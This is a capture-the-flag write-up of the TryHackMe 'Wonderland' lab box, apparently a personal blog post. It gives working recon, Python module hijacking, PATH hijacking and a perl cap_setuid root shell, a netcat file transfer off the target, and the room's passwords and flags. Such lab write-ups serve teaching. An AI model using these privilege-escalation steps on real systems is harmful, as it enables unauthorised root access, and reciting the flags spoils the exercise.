---
title: TryHackMe - Wonderland
description: My writeup on Wonderland box.
categories:
 - tryhackme
tags: tryhackme gobuster python hijacking PATH capabilities perl
---

![](https://i.imgur.com/DECYWDh.png)

## Box Stats

| Box Info      | Details       |
| ------------- |:-------------:|
| Box Name :    | **Wonderland**  |
| Difficulty :  | **Medium**             |
| Play :    | [Wonderland](https://tryhackme.com/room/wonderland){:target="_blank"}      |
| Recommended : | Yes :heavy_check_mark:      |

## Summary

This is a box that tought me some new things, i really enjoyed pwning it! Getting shell is the easy part, then we have to deal with multiple privilege escalations. The first 2 are about hijacking and then last one is about capabilities. Let's start!

## Enumeration/Reconnaissance

Now as always let’s continue with a nmap scan.

```
$ ip=10.10.210.206
$ nmap -sC -sV -oN nmap/wonderland.thm $ip
Starting Nmap 7.91 ( https://nmap.org ) at 2021-01-04 23:05 EET
Nmap scan report for 10.10.210.206 (10.10.210.206)
Host is up (0.13s latency).
Not shown: 998 closed ports
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   2048 8e:ee:fb:96:ce:ad:70:dd:05:a9:3b:0d:b0:71:b8:63 (RSA)
|   256 7a:92:79:44:16:4f:20:43:50:a9:a8:47:e2:c2:be:84 (ECDSA)
|_  256 00:0b:80:44:e6:3d:4b:69:47:92:2c:55:14:7e:2a:c9 (ED25519)
80/tcp open  http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: Follow the white rabbit.
```

Once we visit the web page we see a message `Follow the White Rabbit.`. Checking the source code nothing interesting, let's fire up a `gobuster` scan.

```
$ gobuster dir -q -u http://$ip/ -w $medium -x php,txt,html,js -o scans/gobuster.txt  
/index.html (Status: 301)
/img (Status: 301)
/r (Status: 301)
```

Visiting the `/r` directory we see a message `Keep Going.`, then i guessed the whole path. Before the message said `Follow the White Rabbit.` So:

```
http://10.10.210.206/r/
http://10.10.210.206/r/a/
http://10.10.210.206/r/a/b/
http://10.10.210.206/r/a/b/b/
http://10.10.210.206/r/a/b/b/i/
http://10.10.210.206/r/a/b/b/i/t
```

## Shell as alice

Here we go, checking the source code i found some credentials `alice:HowDothTheLittleCrocodileImproveHisShiningTail`. We can use them with SSH.

```
$ ssh alice@$ip
alice@10.10.210.206's password:

alice@wonderland:~$ whoami;id
alice
uid=1001(alice) gid=1001(alice) groups=1001(alice)
```

## Shell as rabbit

While doing my manual enumeration for privesc i found on `sudo -l` that we can run a python file as user rabbit.

```
alice@wonderland:~$ sudo -l
[sudo] password for alice:
Matching Defaults entries for alice on wonderland:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User alice may run the following commands on wonderland:
    (rabbit) /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
```

Sadly we can't edit it.

```
alice@wonderland:~$ ls -la walrus_and_the_carpenter.py
-rw-r--r-- 1 root root 3577 May 25  2020 walrus_and_the_carpenter.py
```

Here i stuck for a long time, source code has nothing interesting only a poem. I noticed the `random` module so i googled `python random module privilege escalation` and i found out the solution this privesc is about python library hijacking.

Running this command:

```
alice@wonderland:~$ python3 -c 'import sys; print(sys.path)'
['', '/usr/lib/python36.zip', '/usr/lib/python3.6', '/usr/lib/python3.6/lib-dynload', '/usr/local/lib/python3.6/dist-packages', '/usr/lib/python3/dist-packages']
```

Show us the list of directories that python looks in when importing modules. The first one `''` is the current directory.

So we will create a new file in the same directory as the `walrus_and_the_carpenter.py`, named `random.py` because it imports `random`. So the next time we run the file will load our version of the random module, because it appears first in the search paths.

```
alice@wonderland:~$ touch random.py
alice@wonderland:~$ printf "import os\nos.system('/bin/bash')" >> random.py
alice@wonderland:~$ sudo -u rabbit /usr/bin/python3.6 /home/alice/walrus_and_the_carpenter.py
[sudo] password for alice:
rabbit@wonderland:~$ whoami;id
rabbit
uid=1002(rabbit) gid=1002(rabbit) groups=1002(rabbit)
```

## Shell as hatter

Moving to rabbit directory, i see a binary `teaParty` when we run it just says a message:

```
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by Mon, 04 Jan 2021 22:38:19 +0000
Ask very nicely, and I will give you some tea while you wait for him
```

Let's move it to our machine to analyze it, we can do that using netcat!

On our box we execute this -> `nc -l -p 5555 > teaParty`

On target box we send the file -> `nc -w 3 $your_tun0_ip 5555 < teaParty`

Running `strings` on it we can see that it executes `date`:

```
$ strings teaParty | grep date
/bin/echo -n 'Probably by ' && date --date='next hour' -R
```

We can see it calls date without specifying the path. This means we can hijack the PATH and execute our date. We will make a `date` file with `/bin/bash` in and then we will change the PATH to look in our directory first, so it will execute our `date` file first.

```
rabbit@wonderland:/home/rabbit$ echo "/bin/bash" > date
rabbit@wonderland:/home/rabbit$ chmod 777 date
rabbit@wonderland:/home/rabbit$ export PATH=/home/rabbit:$PATH
rabbit@wonderland:/home/rabbit$ echo $PATH
/home/rabbit:/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/snap/bin
rabbit@wonderland:/home/rabbit$ ./teaParty
Welcome to the tea party!
The Mad Hatter will be here soon.
Probably by
hatter@wonderland:/home/rabbit$ whoami;id
hatter
uid=1003(hatter) gid=1002(rabbit) groups=1002(rabbit)
```

Checking hatter's directory i found his password, so we can login using SSH as hatter.

```
hatter@wonderland:/home/hatter$ cat password.txt
WhyIsARavenLikeAWritingDesk?
```

```
$ ssh hatter@$ip
hatter@10.10.85.152's password:

hatter@wonderland:~$ whoami;id
hatter
uid=1003(hatter) gid=1003(hatter) groups=1003(hatter)
```

## Shell as root

This final privesc is about capabilities. Capabilities are similar to SUID but they limit user’s permissions etc.

Let's scan the system for capabilities.

```
hatter@wonderland:~$ getcap -r / 2>/dev/null
/usr/bin/perl5.26.1 = cap_setuid+ep
/usr/bin/mtr-packet = cap_net_raw+ep
/usr/bin/perl = cap_setuid+ep
```

We can see `perl` has the `CAP_SETUID` capability this mean we can change the UID. [GTFOBINS](https://gtfobins.github.io/gtfobins/perl/#capabilities){:target="_blank"} has the answer.

```
hatter@wonderland:~$ perl -e 'use POSIX qw(setuid); POSIX::setuid(0); exec "/bin/sh";'
# whoami;id
root
uid=0(root) gid=1003(hatter) groups=1003(hatter)
```

Let's read the flags. (They're reversed LOL)

```
# cat /root/user.txt
thm{"Curiouser and curiouser!"}
# cat /home/alice/root.txt
thm{Twinkle, twinkle, little bat! How I wonder what you’re at!}
```

## Thank You

Thank you for taking the time to read my writeup. If you don't understand something from the writeup or want to ask me something feel free to contact me through discord(0xatom#8707) or send me a message through twitter [0xatom](https://twitter.com/0xatom){:target="_blank"}

Until next time keep pwning hard! :fire:
